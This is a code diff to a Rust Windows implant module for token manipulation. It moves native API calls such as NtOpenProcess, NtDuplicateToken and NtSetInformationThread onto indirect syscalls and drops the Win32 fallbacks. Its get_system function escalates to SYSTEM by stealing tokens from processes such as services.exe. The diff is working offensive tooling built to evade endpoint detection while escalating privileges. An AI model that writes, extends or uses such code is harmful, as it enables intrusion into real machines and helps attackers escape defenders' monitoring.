@@ -17,8 +17,7 @@ use winapi::um::winnt::{
     HANDLE, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_IMPERSONATE,
     TOKEN_QUERY, SecurityImpersonation, TokenImpersonation,
 };
-// CloseHandle kept as fallback inside nt_close_handle() only.
-use winapi::um::handleapi::CloseHandle;
+// CloseHandle removed — using NtClose indirect syscall exclusively.
 
 /// Stores the impersonation token so `Rev2Self` can close it.
 static SAVED_TOKEN: Mutex<Option<HANDLE>> = Mutex::new(None);
@@ -66,9 +65,9 @@ unsafe fn nt_open_process(pid: u32) -> Result<HANDLE> {
     let mut cid: CLIENT_ID = std::mem::zeroed();
     cid.UniqueProcess = pid as *mut _;
 
-    let target = nt_syscall::get_syscall_id("NtOpenProcess")
+    let target = crate::syscalls::get_syscall_id("NtOpenProcess")
         .map_err(|e| anyhow!("failed to resolve NtOpenProcess SSN: {e}"))?;
-    let status = nt_syscall::do_syscall(
+    let status = crate::syscalls::do_syscall(
         target.ssn,
         target.gadget_addr,
         &[
@@ -89,9 +88,9 @@ unsafe fn nt_open_process(pid: u32) -> Result<HANDLE> {
 /// Call `NtOpenProcessToken` via indirect syscall.
 unsafe fn nt_open_process_token(process: HANDLE, access: u32) -> Result<HANDLE> {
     let mut token: HANDLE = std::ptr::null_mut();
-    let target = nt_syscall::get_syscall_id("NtOpenProcessToken")
+    let target = crate::syscalls::get_syscall_id("NtOpenProcessToken")
         .map_err(|e| anyhow!("failed to resolve NtOpenProcessToken SSN: {e}"))?;
-    let status = nt_syscall::do_syscall(
+    let status = crate::syscalls::do_syscall(
         target.ssn,
         target.gadget_addr,
         &[
@@ -115,13 +114,7 @@ fn nt_close_handle(handle: u64) {
     if handle == 0 || handle == usize::MAX as u64 {
         return;
     }
-    if let Ok(target) = nt_syscall::get_syscall_id("NtClose") {
-        let _ = unsafe {
-            nt_syscall::do_syscall(target.ssn, target.gadget_addr, &[handle])
-        };
-    } else {
-        unsafe { CloseHandle(handle as *mut _ as HANDLE) };
-    }
+    let _ = syscall!("NtClose", handle);
 }
 
 /// Call `NtOpenThreadToken` via indirect syscall.
@@ -134,9 +127,9 @@ unsafe fn nt_open_thread_token(
     open_as_self: bool,
 ) -> Result<HANDLE> {
     let mut token: HANDLE = std::ptr::null_mut();
-    let target = nt_syscall::get_syscall_id("NtOpenThreadToken")
+    let target = crate::syscalls::get_syscall_id("NtOpenThreadToken")
         .map_err(|e| anyhow!("failed to resolve NtOpenThreadToken SSN: {e}"))?;
-    let status = nt_syscall::do_syscall(
+    let status = crate::syscalls::do_syscall(
         target.ssn,
         target.gadget_addr,
         &[
@@ -158,7 +151,7 @@ unsafe fn nt_open_thread_token(
 /// Passing a null token clears the impersonation token (equivalent to
 /// `RevertToSelf`).  Returns the raw NTSTATUS.
 unsafe fn nt_set_thread_token(thread: HANDLE, token: HANDLE) -> i32 {
-    let target = match nt_syscall::get_syscall_id("NtSetInformationThread") {
+    let target = match crate::syscalls::get_syscall_id("NtSetInformationThread") {
         Ok(t) => t,
         Err(e) => {
             log::error!("token_manipulation: failed to resolve NtSetInformationThread SSN: {e}");
@@ -172,7 +165,7 @@ unsafe fn nt_set_thread_token(thread: HANDLE, token: HANDLE) -> i32 {
     //   ThreadInformationLength  // sizeof(HANDLE)
     // )
     let token_value = token as u64;
-    nt_syscall::do_syscall(
+    crate::syscalls::do_syscall(
         target.ssn,
         target.gadget_addr,
         &[
@@ -191,11 +184,11 @@ unsafe fn nt_query_system_information(
     size: u32,
     return_length: *mut u32,
 ) -> i32 {
-    let target = match nt_syscall::get_syscall_id("NtQuerySystemInformation") {
+    let target = match crate::syscalls::get_syscall_id("NtQuerySystemInformation") {
         Ok(t) => t,
         Err(_) => return -1,
     };
-    nt_syscall::do_syscall(
+    crate::syscalls::do_syscall(
         target.ssn,
         target.gadget_addr,
         &[
@@ -249,9 +242,9 @@ unsafe fn nt_duplicate_token(
     //   ExistingTokenHandle, DesiredAccess, ObjectAttributes,
     //   EffectiveOnly, TokenType, NewTokenHandle
     // )
-    let target = nt_syscall::get_syscall_id("NtDuplicateToken")
+    let target = crate::syscalls::get_syscall_id("NtDuplicateToken")
         .map_err(|e| anyhow!("failed to resolve NtDuplicateToken SSN: {e}"))?;
-    let status = nt_syscall::do_syscall(
+    let status = crate::syscalls::do_syscall(
         target.ssn,
         target.gadget_addr,
         &[
@@ -546,7 +539,25 @@ pub fn get_system() -> Result<String> {
         "services.exe",
     ];
 
-    let my_pid = unsafe { winapi::um::processthreadsapi::GetCurrentProcessId() };
+    // GetCurrentProcessId → NtQueryInformationProcess(ProcessBasicInformation)
+    #[repr(C)]
+    struct Pbi {
+        reserved1: *mut std::ffi::c_void,
+        peb_base_address: *mut std::ffi::c_void,
+        reserved2: [*mut std::ffi::c_void; 2],
+        unique_process_id: usize,
+        inherited_from_unique_process_id: usize,
+    }
+    let mut pbi: Pbi = std::mem::zeroed();
+    let _ = syscall!(
+        "NtQueryInformationProcess",
+        (-1isize) as u64, // NtCurrentProcess()
+        0u64,              // ProcessBasicInformation
+        &mut pbi as *mut _ as u64,
+        std::mem::size_of::<Pbi>() as u64,
+        std::ptr::null_mut::<u64>() as u64,
+    );
+    let my_pid = pbi.unique_process_id as u32;
 
     // Iterate process list. Each entry has a NextEntryOffset at offset 0.
     // If NextEntryOffset == 0, this is the last entry.
